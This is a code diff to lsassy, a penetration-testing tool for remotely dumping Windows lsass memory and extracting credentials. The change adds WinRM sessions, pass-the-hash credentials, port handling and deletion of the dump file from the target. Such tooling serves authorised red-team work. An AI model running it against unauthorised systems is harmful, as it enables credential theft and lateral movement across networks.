@@ -5,10 +5,9 @@ import time
 from queue import Queue
 
 from lsassy.dumper import Dumper
-from lsassy.impacketfile import ImpacketFile
 from lsassy.logger import lsassy_logger
 from lsassy.parser import Parser
-from lsassy.session import Session
+from lsassy.session import Session, WinrmSession
 from lsassy.utils import get_targets
 from lsassy.writer import Writer
 
@@ -103,7 +102,10 @@ class Lsassy:
 
         # Credential parsing
         username = self.args.username if self.args.username else ""
+        file_username = self.args.file_username if self.args.file_username else username
+
         password = self.args.password if self.args.password else ""
+        file_password = self.args.file_password if self.args.file_password else password
 
         lmhash, nthash = "", ""
         if not password and self.args.hashes:
@@ -112,8 +114,26 @@ class Lsassy:
             else:
                 lmhash, nthash = "aad3b435b51404eeaad3b435b51404ee", self.args.hashes
 
+        file_lmhash, file_nthash = "", ""
+        if not file_password and self.args.file_hashes:
+            if ":" in self.args.file_hashes:
+                file_lmhash, file_nthash = self.args.file_hashes.split(":")
+            else:
+                file_lmhash, file_nthash = "aad3b435b51404eeaad3b435b51404ee", self.args.file_hashes
+
+
+
+
         # Exec methods parsing
         exec_methods = self.args.exec.split(",") if self.args.exec else None
+        if exec_methods and "winrm" in exec_methods and len(exec_methods)>1:
+            lsassy_logger.error(f"Incompatible methods winrm and {exec_methods} - can only use either winrm or others")
+
+        # Ports parsing
+        if self.args.file_port == 0:
+            self.args.file_port = 5985 if self.args.file_interaction == "winrm" else 445
+        if self.args.port == 0:
+            self.args.port = 5985 if exec_methods and "winrm" in exec_methods else 445
 
         # Dump modules options parsing
         options = (
@@ -154,15 +174,18 @@ class Lsassy:
             return False
 
         try:
-            session = Session()
+            if self.args.file_interaction == "winrm":
+                session = WinrmSession()
+            else:
+                session = Session()
             session.get_session(
                 address=self.target,
                 target_ip=self.target,
-                port=self.args.port,
-                lmhash=lmhash,
-                nthash=nthash,
-                username=username,
-                password=password,
+                port=self.args.file_port,
+                lmhash=file_lmhash,
+                nthash=file_nthash,
+                username=file_username,
+                password=file_password,
                 domain=self.args.domain,
                 aesKey=self.args.aesKey,
                 dc_ip=self.args.dc_ip,
@@ -170,13 +193,38 @@ class Lsassy:
                 timeout=self.args.timeout,
             )
 
+            if exec_methods and "winrm" in exec_methods:
+                exec_session = WinrmSession()
+            else:
+                exec_session = Session()
+            # if the sessions are the same we dont want two sessions
+            if isinstance(exec_session, type(session)):
+                del exec_session
+                exec_session = session
+            else:
+                exec_session.get_session(
+                    address=self.target,
+                    target_ip=self.target,
+                    port=self.args.port,
+                    lmhash=lmhash,
+                    nthash=nthash,
+                    username=username,
+                    password=password,
+                    domain=self.args.domain,
+                    aesKey=self.args.aesKey,
+                    dc_ip=self.args.dc_ip,
+                    kerberos=self.args.kerberos,
+                    timeout=self.args.timeout,
+                )
+
+
             if session.smb_session is None:
                 lsassy_logger.warning("Couldn't connect to remote host")
                 return False
 
             if not parse_only:
                 dumper = Dumper(
-                    session, self.args.timeout, self.args.time_between_commands
+                    exec_session, session, self.args.timeout, self.args.time_between_commands
                 ).load(self.args.dump_method)
                 if dumper is None:
                     lsassy_logger.error("Unable to load dump module")
@@ -194,7 +242,7 @@ class Lsassy:
                     lsassy_logger.error("Unable to dump lsass.")
                     return False
             else:
-                file = ImpacketFile(session).open(
+                file = session.correct_file_handler()(session).open(
                     share="C$",
                     path=dump_path,
                     file=self.args.dump_name,
@@ -210,7 +258,7 @@ class Lsassy:
 
             if not parse_only and not keep_dump:
                 try:
-                    if ImpacketFile.delete(
+                    if session.correct_file_handler().delete(
                         session,
                         file_path=file.get_file_path(),
                         timeout=self.args.timeout,
@@ -221,7 +269,7 @@ class Lsassy:
                         lsassy_logger.debug(
                             "Couldn't delete lsass dump using file. Trying dump object..."
                         )
-                        if ImpacketFile.delete(
+                        if session.correct_file_handler().delete(
                             session,
                             file_path=dumper.dump_path + dumper.dump_name,
                             timeout=self.args.timeout,
@@ -285,6 +333,14 @@ class Lsassy:
 
             try:
                 session.smb_session.close()
+                lsassy_logger.debug("SMB session closed")
+            except Exception as e:
+                lsassy_logger.debug(
+                    "Potential issue while closing SMB session: {}".format(str(e))
+                )
+            try:
+                # Im not gonna break up the whole try except block. If exec_session is unassigned we dont care.
+                exec_session.smb_session.close()
                 lsassy_logger.debug("SMB session closed")
             except Exception as e:
                 lsassy_logger.debug(
